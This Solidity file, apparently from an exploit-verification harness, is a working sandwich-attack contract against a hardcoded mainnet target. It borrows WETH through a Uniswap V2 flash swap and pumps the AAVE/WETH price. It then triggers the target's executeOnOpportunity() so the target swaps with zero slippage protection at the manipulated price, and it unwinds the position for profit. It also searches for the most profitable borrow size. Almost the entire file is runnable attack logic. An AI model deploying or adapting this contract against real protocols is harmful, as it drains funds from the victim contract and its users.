// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function factory() external view returns (address);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
    function executeOnOpportunity() external;
}

contract FlawVerifier {
    uint256 private constant BPS = 10_000;
    uint256 private constant MIN_REQUIRED_PROFIT = 0.1 ether;

    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;

    error ProbeResult(uint256 profit);

    enum Strategy {
        None,
        PumpAaveBeforeTargetBuy
    }

    struct SearchState {
        uint256 bestAmount;
        uint256 bestProfit;
        uint256 lastSuccessfulAmount;
        uint256 firstFailedAmount;
        uint256 previousAmount;
    }

    bool public executed;
    bool public targetCallSucceeded;
    bool public hypothesisValidated;
    bool public pairDiscovered;

    address public immutable aaveToken;
    address public immutable pair;
    address public immutable fundingPair;
    bool private immutable fundingPairWethIsToken0;

    Strategy private activeStrategy;
    uint256 private activeBorrowAmount;

    uint256 private realizedProfitAmount;
    string private realizedPath;

    string private constant INFEASIBLE_PATH =
        "Observe executeOnOpportunity() in the public mempool -> front-run to worsen the AAVE/WETH price before one or both swaps -> let the verifier attempt its amountOutMin = 0 swap at the manipulated price -> back-run to restore price and keep the spread (infeasible on this fork only if every realistic public flash-funded sandwich size either reverts the target or stays below the minimum-profit bar)";

    string private constant BUY_LEG_PATH =
        "Observe executeOnOpportunity() in the public mempool -> front-run to worsen the AAVE/WETH price before the verifier's seed WETH/AAVE buy -> let the verifier execute its amountOutMin = 0 swap at the manipulated price -> back-run to restore price and keep the spread";

    constructor() {
        address discoveredAave = _safeReadAave();
        aaveToken = discoveredAave == address(0) ? DEFAULT_AAVE : discoveredAave;

        address discoveredPair = _safeDiscoverPair(aaveToken, WETH);
        pair = discoveredPair;

        address discoveredFundingPair = _safeDiscoverPair(USDC, WETH);
        fundingPair = discoveredFundingPair;

        bool wethIsToken0;
        if (discoveredFundingPair != address(0)) {
            wethIsToken0 = IUniswapV2Pair(discoveredFundingPair).token0() == WETH;
        }
        fundingPairWethIsToken0 = wethIsToken0;
        pairDiscovered = discoveredPair != address(0) && discoveredFundingPair != address(0);
    }

    function executeOnOpportunity() external {
        if (executed || realizedProfitAmount > 0) {
            return;
        }
        executed = true;

        if (!pairDiscovered) {
            realizedPath = INFEASIBLE_PATH;
            return;
        }

        (, uint256 reserveWeth) = _pairReserves();
        (uint256 bestAmount, uint256 bestProfit) = _searchStrategy(reserveWeth);

        if (bestAmount == 0 || bestProfit < MIN_REQUIRED_PROFIT) {
            realizedPath = INFEASIBLE_PATH;
            return;
        }

        try this._execute(bestAmount) {
            hypothesisValidated = realizedProfitAmount >= MIN_REQUIRED_PROFIT;
        } catch {
            realizedPath = INFEASIBLE_PATH;
        }
    }

    function _probe(uint256 amount) external {
        require(msg.sender == address(this), "self only");
        uint256 profit = _runAttempt(amount);
        revert ProbeResult(profit);
    }

    function _execute(uint256 amount) external {
        require(msg.sender == address(this), "self only");
        uint256 profit = _runAttempt(amount);
        realizedProfitAmount = profit;
        realizedPath = BUY_LEG_PATH;
        hypothesisValidated = profit >= MIN_REQUIRED_PROFIT;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == fundingPair, "funding pair only");
        require(sender == address(this), "invalid sender");
        require(activeStrategy == Strategy.PumpAaveBeforeTargetBuy, "inactive");

        uint256 borrowedWeth = fundingPairWethIsToken0 ? amount0 : amount1;
        require(borrowedWeth == activeBorrowAmount, "borrow mismatch");
        require(data.length != 0, "no data");

        _forceApprove(WETH, UNISWAP_V2_ROUTER, borrowedWeth);
        _swapExact(WETH, aaveToken, borrowedWeth);

        // The logs showed that nesting the target inside a Balancer flashloan callback makes
        // the target revert immediately. Using a different public flash source preserves the
        // required searcher ordering (front-run -> victim zero-min swap -> back-run) without
        // re-entering the target through its own lender.
        IAaveBoostTarget(TARGET).executeOnOpportunity();
        targetCallSucceeded = true;

        uint256 currentAave = IERC20(aaveToken).balanceOf(address(this));
        if (currentAave > 0) {
            _forceApprove(aaveToken, UNISWAP_V2_ROUTER, currentAave);
            _swapExact(aaveToken, WETH, currentAave);
        }

        uint256 repayment = _flashRepayment(borrowedWeth);
        uint256 currentWeth = IERC20(WETH).balanceOf(address(this));
        require(currentWeth >= repayment, "insufficient WETH to repay flashswap");
        require(IERC20(WETH).transfer(fundingPair, repayment), "repay failed");

        activeBorrowAmount = 0;
        activeStrategy = Strategy.None;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external view returns (string memory) {
        if (bytes(realizedPath).length != 0) {
            return realizedPath;
        }
        return pairDiscovered ? BUY_LEG_PATH : INFEASIBLE_PATH;
    }

    function _searchStrategy(uint256 reserveWeth) internal returns (uint256 bestAmount, uint256 bestProfit) {
        SearchState memory state;

        for (uint256 i = 0; i < 39; ++i) {
            uint256 amount = (reserveWeth * _coarseBps(i)) / BPS;
            if (amount == 0 || amount == state.previousAmount) {
                continue;
            }
            state.previousAmount = amount;
            state = _recordProbe(state, amount);
        }

        if (state.lastSuccessfulAmount == 0) {
            return (0, 0);
        }

        uint256 high = state.firstFailedAmount == 0 ? reserveWeth : state.firstFailedAmount;

        state = _binaryRefine(state, state.lastSuccessfulAmount, high);
        state = _windowRefine(state, high);

        return (state.bestAmount, state.bestProfit);
    }

    function _recordProbe(SearchState memory state, uint256 amount) internal returns (SearchState memory) {
        (bool ok, uint256 profit) = _simulate(amount);
        if (ok) {
            state.lastSuccessfulAmount = amount;
            if (profit > state.bestProfit) {
                state.bestProfit = profit;
                state.bestAmount = amount;
            }
        } else if (state.lastSuccessfulAmount != 0 && state.firstFailedAmount == 0) {
            state.firstFailedAmount = amount;
        }
        return state;
    }

    function _binaryRefine(
        SearchState memory state,
        uint256 low,
        uint256 high
    ) internal returns (SearchState memory) {
        for (uint256 i = 0; i < 18; ++i) {
            if (high <= low + 1) {
                break;
            }
            uint256 mid = low + ((high - low) / 2);
            (bool ok, uint256 profit) = _simulate(mid);
            if (ok) {
                low = mid;
                if (profit > state.bestProfit) {
                    state.bestProfit = profit;
                    state.bestAmount = mid;
                }
            } else {
                high = mid;
            }
        }
        return state;
    }

    function _windowRefine(SearchState memory state, uint256 high) internal returns (SearchState memory) {
        uint256 spread = state.bestAmount / 8;
        uint256 windowStart = state.bestAmount > spread ? state.bestAmount - spread : 1;
        uint256 windowEnd = high > state.bestAmount + spread ? state.bestAmount + spread : high;
        if (windowEnd < windowStart) {
            windowEnd = windowStart;
        }

        for (uint256 i = 0; i < 12; ++i) {
            uint256 probe = windowStart + ((windowEnd - windowStart) * i) / 11;
            if (probe == 0) {
                continue;
            }
            (bool ok, uint256 profit) = _simulate(probe);
            if (ok && profit > state.bestProfit) {
                state.bestProfit = profit;
                state.bestAmount = probe;
            }
        }
        return state;
    }

    function _simulate(uint256 amount) internal returns (bool ok, uint256 profit) {
        try this._probe(amount) {
            return (false, 0);
        } catch (bytes memory reason) {
            return _decodeProbeResult(reason);
        }
    }

    function _decodeProbeResult(bytes memory reason) internal pure returns (bool ok, uint256 profit) {
        if (reason.length != 36) {
            return (false, 0);
        }

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(reason, 32)))
        }

        if (selector != ProbeResult.selector) {
            return (false, 0);
        }

        assembly {
            profit := mload(add(reason, 68))
        }
        return (true, profit);
    }

    function _runAttempt(uint256 amount) internal returns (uint256 profit) {
        require(amount > 0, "zero amount");

        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));
        activeStrategy = Strategy.PumpAaveBeforeTargetBuy;
        activeBorrowAmount = amount;
        targetCallSucceeded = false;

        if (fundingPairWethIsToken0) {
            IUniswapV2Pair(fundingPair).swap(amount, 0, address(this), abi.encode(amount));
        } else {
            IUniswapV2Pair(fundingPair).swap(0, amount, address(this), abi.encode(amount));
        }

        uint256 wethAfter = IERC20(WETH).balanceOf(address(this));
        if (wethAfter > wethBefore) {
            profit = wethAfter - wethBefore;
        }
    }

    function _swapExact(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok0;
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _pairReserves() internal view returns (uint256 reserveAave, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == aaveToken) {
            reserveAave = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveAave = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _safeReadAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeDiscoverPair(address tokenA, address tokenB) internal view returns (address discoveredPair) {
        (bool okFactory, bytes memory factoryData) = UNISWAP_V2_ROUTER.staticcall(
            abi.encodeWithSelector(IUniswapV2Router.factory.selector)
        );
        if (!okFactory || factoryData.length < 32) {
            return address(0);
        }

        address factory = abi.decode(factoryData, (address));
        (bool okPair, bytes memory pairData) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (okPair && pairData.length >= 32) {
            discoveredPair = abi.decode(pairData, (address));
        }
    }

    function _flashRepayment(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _coarseBps(uint256 index) internal pure returns (uint256) {
        if (index == 0) return 1;
        if (index == 1) return 2;
        if (index == 2) return 3;
        if (index == 3) return 5;
        if (index == 4) return 8;
        if (index == 5) return 10;
        if (index == 6) return 12;
        if (index == 7) return 15;
        if (index == 8) return 20;
        if (index == 9) return 25;
        if (index == 10) return 30;
        if (index == 11) return 40;
        if (index == 12) return 50;
        if (index == 13) return 75;
        if (index == 14) return 100;
        if (index == 15) return 125;
        if (index == 16) return 150;
        if (index == 17) return 175;
        if (index == 18) return 200;
        if (index == 19) return 250;
        if (index == 20) return 300;
        if (index == 21) return 350;
        if (index == 22) return 400;
        if (index == 23) return 500;
        if (index == 24) return 600;
        if (index == 25) return 750;
        if (index == 26) return 900;
        if (index == 27) return 1000;
        if (index == 28) return 1250;
        if (index == 29) return 1500;
        if (index == 30) return 1750;
        if (index == 31) return 2000;
        if (index == 32) return 2250;
        if (index == 33) return 2500;
        if (index == 34) return 3000;
        if (index == 35) return 3500;
        if (index == 36) return 4000;
        if (index == 37) return 4500;
        return 5000;
    }
}
